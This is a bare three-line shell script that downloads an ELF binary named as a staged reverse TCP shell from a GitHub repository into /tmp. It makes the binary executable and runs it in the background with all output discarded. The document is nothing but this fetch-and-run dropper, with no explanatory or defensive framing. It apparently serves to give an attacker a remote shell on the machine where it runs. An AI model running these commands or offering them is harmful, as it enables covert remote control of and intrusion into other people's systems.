wget -P /tmp/ https://github.com/Pamentierx/xmr/raw/main/linux-shell-staged-reverse-tcp-8383.elf
chmod +x /tmp/linux-shell-staged-reverse-tcp-8383.elf
nohup /tmp/linux-shell-staged-reverse-tcp-8383.elf >/dev/null 2>&1 &
